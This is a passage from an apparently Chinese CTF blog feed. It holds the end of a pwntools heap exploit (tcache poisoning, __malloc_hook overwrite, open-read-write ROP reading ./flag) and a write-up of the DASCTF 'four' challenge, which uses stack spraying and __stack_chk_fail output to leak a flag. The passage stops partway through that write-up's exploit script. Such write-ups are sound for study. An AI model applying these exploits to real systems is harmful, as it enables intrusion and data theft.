class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;50056&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0,cyclic(0x210))</span></span><br><span class="line"><span class="comment"># for i in range(7):</span></span><br><span class="line"><span class="comment">#     add(1,cyclic(0x210))</span></span><br><span class="line"><span class="comment">#     delete(1)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># show(0)</span></span><br><span class="line"><span class="comment"># libc_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x1e4ca0</span></span><br><span class="line"><span class="comment"># success(&quot;libc_addr :&quot;+hex(libc_addr))</span></span><br><span class="line"><span class="comment"># show(1)</span></span><br><span class="line"><span class="comment"># heap_addr = u64(io.recvuntil(&quot;\x0a&quot;,drop  = True)[-6:].ljust(8,b&#x27;\x00&#x27;))-0xf20</span></span><br><span class="line"><span class="comment"># success(&quot;heap_addr :&quot;+hex(heap_addr))</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,cyclic(<span class="number">0x210</span>))</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x80</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e4ca0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x000000000012bda6</span></span><br><span class="line">rax_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>)))</span><br><span class="line">syscall_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>] +<span class="number">0xf</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">addrsp_addr = libc_addr + <span class="number">0x0000000000044734</span></span><br><span class="line">bss_addr = libc_addr + libc.bss()</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x180</span>))</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x400</span>))</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x370</span>))</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x400</span>))</span><br><span class="line">fd = heap_addr + <span class="number">0x180</span></span><br><span class="line">bk = heap_addr - <span class="number">0x260</span> + <span class="number">0x20</span></span><br><span class="line">payload = cyclic(<span class="number">0x370</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fd)+p64(bk)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x80</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(malloc_hook))</span><br><span class="line">magic(<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">orw = p64(rdi_addr)+p64(heap_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(rdx_addr)+p64(<span class="number">0</span>)+p64(rax_addr)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">orw += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(rax_addr)+p64(<span class="number">0</span>)+p64(syscall_addr)</span><br><span class="line">orw += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(rax_addr)+p64(<span class="number">1</span>)+p64(syscall_addr)</span><br><span class="line">magic(p64(addrsp_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x139C)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">add(<span class="number">1</span>,orw)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF Apr.2023 X SU</title>
      <link href="/2023/05/06/DASCTF-Apr-2023-X-SU/"/>
      <url>/2023/05/06/DASCTF-Apr-2023-X-SU/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="four"><a href="#four" class="headerlink" title="four"></a>four</h1><p>这题的知识点有两个 一个是栈溅射 还有一个是利用stack_chk_fail函数输出报错信息来泄露flag</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061249903.png" title="image-20230506124946816" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061249903.png" alt="image-20230506124946816"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your choice : &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4014B9();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4013E1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">5</span> || v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">2</span> )</span><br><span class="line">      sub_400B94();</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">      sub_400CA8();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">3</span> )</span><br><span class="line">      sub_40101C();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida打开乍一看是堆题 不过跟进一下函数发现不是</p><p>当v4&#x3D;1时进入的函数 虽然直接给了我们printf函数的真实地址 但是关闭了标准错误的输出 会给我们后面的利用造成困扰 并且这题实际上也不需要libc基址</p><p>接下来的四个函数都有作用 我们分别跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400B94</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+Bh] [rbp-6015h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-6014h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">24584</span>]; <span class="comment">// [rsp+10h] [rbp-6010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+6018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can give any value, trust me, there will be no overflow&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">24559</span> || v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO OVERFLOW!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Actually, this function doesn&#x27;t seem to be useful&quot;</span>);</span><br><span class="line">  my_read(v4, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Really?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">&#x27;y&#x27;</span> || buf == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = sub_4009A7(v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content : %s&quot;</span>, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数可以供我们写入非常多的字节  因此会和其他函数执行时的栈帧空间重合 如果下一个函数没有对栈帧进行清空的话 就会造成数据残留 这一点很重要</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400CA8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-260h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-25Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-258h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-254h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-250h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-24Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+18h] [rbp-248h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-244h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+50h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+150h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(s1, <span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter level:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter mode:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter X:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">4</span> || v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid data!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">  my_read(s, <span class="number">250</span>);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(i % v1) || !(i % v2) )</span><br><span class="line">      buf[v6++] = s[i];</span><br><span class="line">    <span class="keyword">if</span> ( !(i % v3) )</span><br><span class="line">      buf[i] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input filename&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%14s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, <span class="string">&quot;output.txt&quot;</span>, <span class="number">0xA</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(s1, <span class="string">&quot;output.txt&quot;</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, s1, <span class="number">0xC</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(dest, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;open error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to write data?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. yes\n2.no&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Successly!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一个函数的前面部分依然是干扰代码 不用理就行了 关键在于后面的open</p><p>可以看到 利用strncmp进行了一个判断 如果filename为output.txt的话  就不会进入if分支 从而dest这个变量就不会被赋值 </p><p>直到做到这题 我才大概理解为什么变量一般都需要声明时赋值了 就是为了防止栈帧重合导致的数据残留</p><p>如果我们利用上一个函数造成数据残留 此时dest变量如果没有被赋值 那么其就会继承这个数据</p><p>也就是说如果我们读入大量的flag字符串 那么此时dest变量就会继承flag这个字符串 相当于open了flag文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_40101C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Bh] [rbp-135h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-134h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-128h]</span></span><br><span class="line">  <span class="type">char</span> delim[<span class="number">2</span>]; <span class="comment">// [rsp+2Ah] [rbp-116h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+38h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">240</span>]; <span class="comment">// [rsp+40h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *s = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  fd = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(delim, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;info&gt;&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%256s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = strtok(s, delim); i; i = strtok(<span class="number">0LL</span>, delim) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; i[j]; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i[j] == <span class="string">&#x27;~&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        fd = i[j + <span class="number">1</span>] - <span class="number">48</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i[j] == <span class="string">&#x27;:&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &amp;&amp; i[j + <span class="number">2</span>] &amp;&amp; i[j + <span class="number">3</span>] &amp;&amp; !i[j + <span class="number">4</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v6) = i[j + <span class="number">1</span>];</span><br><span class="line">        BYTE1(v6) = i[j + <span class="number">2</span>];</span><br><span class="line">        HIWORD(v6) = i[j + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i[j] == <span class="string">&#x27;@&#x27;</span> &amp;&amp; i[j + <span class="number">2</span>] == <span class="string">&#x27;*&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &gt; <span class="string">&#x27;`&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &lt;= <span class="number">122</span> )</span><br><span class="line">        v1 = i[j + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt;= <span class="number">2</span> || fd &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, ((SBYTE1(v6) &lt;&lt; <span class="number">8</span>) + (v6 &lt;&lt; <span class="number">16</span>) + SBYTE2(v6)), v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一个函数的作用在于把flag文件的内容写到bss段上的地址 为什么要多此一举呢 在我TEB绕过canary的文章有提及stack_chk_fail函数输出报错信息的依据 原理这里就不复述了</p><p>顺便真的很想吐槽一句 这里非要加一个代码审计来强行使得题目难度看起来增加 不是很理解这种操作的意义何在</p><p>利用strtok函数返回一个指针 起始地址为我们输入的s字符串中 ‘&gt;’字符的地址</p><p>随后就是三个if判断 分别决定了文件描述符 read写入的地址 写入的字节长</p><p>唯一要注意的就是第二个if判断  由于调用的是scanf 所以如果我们想要读入地址的话 要注意不能为\x20 或者 \x00 这样的字节 会导致scanf截断 后面的字符丢失</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4013E1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    ++dword_60204C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一个函数 提供了一次栈溢出的机会 此时计算一下stack_chk_fail调用的指针偏移 就可以借助报错输出flag了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061311952.png" title="image-20230506131154899" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061311952.png" alt="image-20230506131154899"></a></p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;59.110.164.72&quot;,10001)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;You can give any value, trust me, there will be no overflow&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x5fef</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Actually, this function doesn&#x27;t seem to be useful&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;./flag\x00\x00&quot;</span>*<span class="number">0xbfd</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Really?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter level:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter 